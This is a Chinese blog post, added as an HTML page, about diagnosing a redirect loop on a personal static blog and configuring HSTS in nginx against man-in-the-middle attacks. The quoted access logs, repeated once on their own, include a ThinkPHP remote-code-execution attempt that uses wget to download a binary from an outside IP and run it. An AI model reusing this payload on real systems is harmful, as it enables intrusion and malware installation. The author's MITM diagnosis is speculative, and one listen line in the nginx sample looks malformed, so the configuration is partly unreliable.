@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="御敌于外：配置HSTS防御中间人攻击 - 编内文章">
+    <meta name="author" content="Blog Author">
+    <title>御敌于外：配置HSTS防御中间人攻击 - 编外</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Source+Serif+Pro:ital,wght@0,400;0,600;0,700;1,400&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="../css/base.css">
+    <link rel="stylesheet" href="../css/typography.css">
+    <link rel="stylesheet" href="../css/layout.css">
+    <link rel="stylesheet" href="../css/components.css">
+</head>
+<body>
+    <header class="site-header" role="banner">
+        <div class="container">
+            <nav class="main-nav" role="navigation" aria-label="主导航">
+                <div class="nav-brand">
+                    <a href="../index.html" class="brand-link">编外</a>
+                </div>
+                <ul class="nav-list">
+                    <li><a href="../index.html" class="nav-link">首页</a></li>
+                    <li class="nav-dropdown">
+                        <a href="#" class="nav-link">栏目 <span class="dropdown-arrow">▼</span></a>
+                        <ul class="dropdown-menu">
+                            <li><a href="../collection/inside.html" class="dropdown-link active">编内</a></li>
+                            <li><a href="../collection/outside.html" class="dropdown-link">编外</a></li>
+                            <li><a href="../collection/weekly.html" class="dropdown-link">周刊</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="../collection/inside.html" class="nav-link">全部文章</a></li>
+                    <li><a href="../tags.html" class="nav-link">标签</a></li>
+                    <li><a href="../about.html" class="nav-link">关于</a></li>
+                </ul>
+                <button class="nav-toggle" aria-label="切换导航菜单" aria-expanded="false">
+                    <span class="hamburger"></span>
+                </button>
+            </nav>
+        </div>
+    </header>
+
+    <main class="main-content" role="main">
+        <!-- 面包屑导航 -->
+        <div class="container">
+            <nav class="breadcrumb" role="navigation" aria-label="面包屑导航">
+                <div class="breadcrumb-item">
+                    <a href="../index.html" class="breadcrumb-link">首页</a>
+                    <span class="breadcrumb-separator">/</span>
+                </div>
+                <div class="breadcrumb-item">
+                    <a href="../collection/inside.html" class="breadcrumb-link">编内</a>
+                    <span class="breadcrumb-separator">/</span>
+                </div>
+                <div class="breadcrumb-item">
+                    <span class="breadcrumb-current">御敌于外：配置HSTS防御中间人攻击</span>
+                </div>
+            </nav>
+        </div>
+
+        <!-- 文章内容 -->
+        <article class="article-content">
+            <div class="container">
+                <header class="article-header">
+                    <h1 class="article-title">御敌于外：配置HSTS防御中间人攻击</h1>
+                    <div class="article-meta">
+                        <time datetime="2020-07-30" class="article-date">2020年7月30日</time>
+                        <span class="reading-time">阅读时间 10 分钟</span>
+                        <span class="article-category">编内</span>
+                    </div>
+                    <div class="article-tags">
+                        <span class="tag">网络安全</span>
+                        <span class="tag">HTTPS</span>
+                        <span class="tag">中间人攻击</span>
+                        <span class="tag">HSTS</span>
+                        <span class="tag">Nginx</span>
+                    </div>
+                </header>
+
+                <div class="article-body">
+                    <h2 id="背景介绍">背景介绍</h2>
+                    <p>之前在自己的服务器上架设了<a href="https://zhiyulife.pp.ua">博客</a>并发布到了公网，考虑到安全性还特意加了HTTPS支持。稳定运行一段时间之后前两个星期忽然就无法访问了，以下是我的破案纪实。</p>
+
+                    <h2 id="案发现场博客无法访问">案发现场：博客无法访问</h2>
+                    <p>之前搭建的博客突然不能访问了，浏览器提示<strong>重定向次数过多</strong>，我就有了不好的预感，去服务器上看扫了一眼<code>nginx</code>访问日志，果然发现了一点猫腻。</p>
+
+                    <pre><code>41.230.21.146 - - [26/Jul/2020:04:06:50 +0800] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://45.95.168.230/taevimncorufglbzhwxqpdkjs/Meth.x86 -O thinkphp ; chmod 777 thinkphp ; ./thinkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 157 "-" "Uirusu/2.0"
+93.171.157.190 - - [26/Jul/2020:04:28:29 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+162.243.128.166 - - [26/Jul/2020:05:10:37 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x"
+177.96.170.216 - - [26/Jul/2020:05:21:32 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
+35.220.228.17 - - [26/Jul/2020:05:33:38 +0800] "POST /spywall/timeConfig.php HTTP/1.1" 400 157 "-" "XTC"
+46.105.117.7 - - [26/Jul/2020:05:36:30 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x"
+141.101.105.202 - - [26/Jul/2020:05:36:30 +0800] "GET / HTTP/1.1" 301 169 "http://95.179.179.26:80/" "Mozilla/5.0 zgrab/0.x"
+141.101.105.202 - - [26/Jul/2020:05:36:30 +0800] "GET / HTTP/1.1" 301 169 "https://zhiyulife.pp.ua/" "Mozilla/5.0 zgrab/0.x"
+151.235.230.43 - - [26/Jul/2020:05:45:03 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
+46.105.117.7 - - [26/Jul/2020:05:49:05 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x"
+172.69.54.103 - - [26/Jul/2020:05:49:05 +0800] "GET / HTTP/1.1" 301 169 "https://95.179.179.26:443/" "Mozilla/5.0 zgrab/0.x"
+172.69.54.103 - - [26/Jul/2020:05:49:05 +0800] "GET / HTTP/1.1" 301 169 "https://zhiyulife.pp.ua/" "Mozilla/5.0 zgrab/0.x"
+139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /manager/top.asp HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
+139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /index.php/_login/in HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
+139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /11.txt HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
+139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /db/admin_yly.sql HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
+139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
+139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /cgi-bin HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
+139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /js/preload/example.txt HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
+172.69.33.237 - - [26/Jul/2020:05:57:09 +0800] "GET /db/admin_yly.sql HTTP/1.1" 301 169 "http://95.179.179.26/db/admin_yly.sql" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
+172.69.34.226 - - [26/Jul/2020:05:57:09 +0800] "GET /index.php/_login/in HTTP/1.1" 301 169 "http://95.179.179.26/index.php/_login/in" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
+172.69.35.69 - - [26/Jul/2020:05:57:09 +0800] "GET / HTTP/1.1" 301 169 "http://95.179.179.26/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
+172.69.33.185 - - [26/Jul/2020:05:57:09 +0800] "GET /js/preload/example.txt HTTP/1.1" 301 169 "http://95.179.179.26/js/preload/example.txt" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
+172.69.33.43 - - [26/Jul/2020:05:57:09 +0800] "GET /11.txt HTTP/1.1" 301 169 "http://95.179.179.26/11.txt" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"</code></pre>
+
+                    <p>第一条日志就发现问题了，我的博客是个静态页面网站，跟PHP完全没有关系，而且URL后面跟的那一堆明显是攻击的函数。</p>
+
+                    <pre><code>invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://45.95.168.230/taevimncorufglbzhwxqpdkjs/Meth.x86 -O thinkphp ; chmod 777 thinkphp ; ./thinkphp ThinkPHP ; rm -rf thinkphp'</code></pre>
+
+                    <p>再看后面的日志，都是访问一些不知所云的页面，并且都是<code>301</code>重定向，因此我估计在重定向HTTPS的时候出现了问题。</p>
+
+                    <h2 id="追根溯源锁定凶手">追根溯源，锁定凶手</h2>
+
+                    <blockquote>
+                    <p>中间人攻击（英语：Man-in-the-middle attack，缩写：MITM）在密码学和计算机安全领域中是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络）。</p>
+                    <p>一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。</p>
+                    <p>来自：<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB">维基百科：中间人攻击</a></p>
+                    </blockquote>
+
+                    <p>中间人攻击是比较常见的网络攻击手段，如果通讯双方缺少有效的认证手段就有可能导致中间人攻击。</p>
+
+                    <p>一般来说如果网站配置了HTTPS，双方通讯就都是可靠加密了。不过用户习惯很难直接改变，包括我也一样，不会特意去敲上一段<code>https://</code>，因此网站一般都会通过重定向HTTP到HTTPS来保证使用HTTPS。</p>
+
+                    <p>从可见的日志推断，我认为自己的网站最有可能遭受了中间人攻击。</p>
+
+                    <h2 id="御敌于外配置hsts">御敌于外：配置HSTS</h2>
+                    <p>基本确定了凶手之后，就可以查询解决方案。一番查找之后，发现针对中间人攻击，目前主要的方案是采用<strong>HSTS</strong>。</p>
+
+                    <blockquote>
+                    <p>HSTS（HTTP Strict Transport Security, HTTP严格传输安全协议）表明网站已经实现了TLS，要求浏览器对用户明文访问的Url重写成HTTPS，避免了始终强制302重定向的延时开销。</p>
+                    <p>来自：<a href="https://blog.csdn.net/zhuyiquan/article/details/71430020#21-hsts%E7%9A%84%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8">电商网站HTTPS实践之路（三）——性能优化篇</a></p>
+                    </blockquote>
+
+                    <h3 id="hsts基本语法">HSTS基本语法</h3>
+
+                    <p>落实到具体实现中，就是在响应中增加<code>Strict-Transport-Security</code>头部，其基本语法如下：</p>
+
+                    <p><code>Strict-Transport-Security: max-age=expireTime [; includeSubDomains] [; preload]</code></p>
+
+                    <table>
+                    <thead>
+                    <tr>
+                    <th>参数</th>
+                    <th>可选</th>
+                    <th>说明</th>
+                    </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                    <td>max-age</td>
+                    <td>必选</td>
+                    <td>单位为秒，代表HSTS Header的过期时间，一般设置为1年，即 31536000秒。</td>
+                    </tr>
+                    <tr>
+                    <td>includeSubDomains</td>
+                    <td>可选</td>
+                    <td>如果开启说明当前域名及子域名开启HSTS保护</td>
+                    </tr>
+                    <tr>
+                    <td>preload</td>
+                    <td>可选</td>
+                    <td>只有当你申请将自己的域名加入到浏览器内置列表的时候才需要使用到它</td>
+                    </tr>
+                    </tbody>
+                    </table>
+
+                    <h3 id="nginx配置hsts">Nginx配置HSTS</h3>
+
+                    <p>对于<code>Nginx</code>来说，只要增加以下配置</p>
+
+                    <pre><code>server {
+      listen xxx.abc.com;
+      server_name xxx.abc.com;
+      rewrite ^/(.*)$ https://$host$1 permanent;
+    }
+    server {
+      listen       443 ssl;
+      server_name  xxx.abc.com;
+      # 增加头部信息
+      add_header Strict-Transport-Security "max-age=172800; includeSubDomains";
+      ssl_certificate      cert/server.crt;
+      ssl_certificate_key  cert/server.key;
+
+      ssl_session_cache    shared:SSL:1m;
+      ssl_session_timeout  5m;
+
+      ssl_ciphers  HIGH:!aNULL:!MD5;
+      ssl_prefer_server_ciphers  on;
+
+      location / {
+        proxy_pass http://localhost:3001;
+      }
+    }</code></pre>
+
+                    <h3 id="预加载hsts">预加载HSTS</h3>
+
+                    <p>不过从HSTS的原理来说即使配置了HSTS依然有被攻击的可能，浏览器第一次或者超期后访问网站时还是要再次请求HTTP。想要解决这个问题最好让浏览器在一开始就知道目标网站使用HTTPS，那么每次访问这个网站将都使用HTTPS进行请求。</p>
+
+                    <p>预加载HSTS就是实现这个功能。Chrome、Firefox等浏览器内置了一份预加载列表，声明了需要使用HTTPS访问的网址，这样的话每次请求时浏览器内部就自动为其转换为HTTPS。</p>
+
+                    <p>自建的网站可以申请加入预加载HSTS列表中，官方网址为：<a href="https://hstspreload.org">https://hstspreload.org</a> 。</p>
+
+                    <p>需要满足以下几个要求：</p>
+
+                    <blockquote>
+                    <p><strong>Submission Requirements</strong></p>
+                    <p>If a site sends the preload directive in an HSTS header, it is considered to be requesting inclusion in the preload list and may be submitted via the form on this site.</p>
+                    <p>In order to be accepted to the HSTS preload list through this form, your site must satisfy the following set of requirements:</p>
+                    <ol>
+                    <li>Serve a valid certificate.</li>
+                    <li>Redirect from HTTP to HTTPS on the same host, if you are listening on port 80.</li>
+                    <li>Serve all subdomains over HTTPS.
+                    <ul>
+                    <li>In particular, you must support HTTPS for the www subdomain if a DNS record for that subdomain exists.</li>
+                    </ul>
+                    </li>
+                    <li>Serve an HSTS header on the base domain for HTTPS requests:
+                    <ul>
+                    <li>The max-age must be at least 31536000 seconds (1 year).</li>
+                    <li>The includeSubDomains directive must be specified.</li>
+                    <li>The preload directive must be specified.</li>
+                    <li>If you are serving an additional redirect from your HTTPS site, that redirect must still have the HSTS header (rather than the page it redirects to).</li>
+                    </ul>
+                    </li>
+                    </ol>
+                    </blockquote>
+
+                    <ol>
+                    <li>有可信的证书</li>
+                    <li>如果网页有监听80端口，需要重定向到HTTPS</li>
+                    <li>所有子域名都要使用HTTPS</li>
+                    <li>添加HSTS响应头，
+                    <ul>
+                    <li>max-age 必须至少是 31536000 秒（1 年）。</li>
+                    <li>必须指定 includeSubDomains 参数。</li>
+                    <li>必须指定 preload 参数。</li>
+                    <li>如果该 HTTPS 网站存在其他重定向，那么重定向也必须具有 HSTS 头。</li>
+                    </ul>
+                    </li>
+                    </ol>
+
+                    <h2 id="总结与疑问">总结与疑问</h2>
+
+                    <p>其实除了那么多重定向的日志之外，我还在日志中发现了爬虫的痕迹。</p>
+
+                    <p>以往我所开发的服务都是运行在内网中，就像还在象牙塔中的学生一样，高高筑起的围墙虽然限制了很多自由，但在很多情况下又是对我们的保护。只是将博客部署到公网的服务器上，险恶的现实就露出了自己的獠牙。</p>
+
+                    <p>当然面对层出不穷的问题，退缩回象牙塔内并不能有所助益。因为网络的开放性注定了攻击者永远存在，因此熟悉并了解攻击者的手段，知难而上解决问题才能继续生存下去。</p>
+
+                    <p>当然故事还远没有结束，我还是有许多疑问：</p>
+                    <ol>
+                    <li>中间人到底在哪里？是暗藏在我的电脑中？还是暗藏在我的服务器中？</li>
+                    <li>为什么会不断重定向？</li>
+                    </ol>
+
+                    <h2 id="参考资料">参考资料</h2>
+                    <ol>
+                    <li><a href="https://blog.csdn.net/zhuyiquan/article/details/72654247">对301重定向到HTTPS前遭遇中间人攻击的分析</a></li>
+                    <li><a href="https://cherysunzhang.com/2020/03/hsts-and-github-attacked-by-mitm/">从 GitHub 受到中间人攻击一事再看 HSTS</a></li>
+                    </ol>
+                </div>
+            </div>
+        </article>
+
+        <!-- 文章导航 -->
+        <nav class="article-navigation" role="navigation" aria-label="文章导航">
+            <div class="container">
+                <div class="nav-links">
+                    <a href="../collection/inside.html" class="nav-link back">
+                        <span class="nav-icon">←</span>
+                        <span class="nav-text">返回编内</span>
+                    </a>
+                </div>
+            </div>
+        </nav>
+    </main>
+
+    <footer class="site-footer" role="contentinfo">
+        <div class="container">
+            <div class="footer-content">
+                <p class="copyright">&copy; 2024 编外. 保留所有权利。</p>
+                <div class="footer-links">
+                    <a href="#" class="footer-link" aria-label="RSS订阅">RSS</a>
+                    <a href="#" class="footer-link" aria-label="GitHub">GitHub</a>
+                    <a href="#" class="footer-link" aria-label="Twitter">Twitter</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
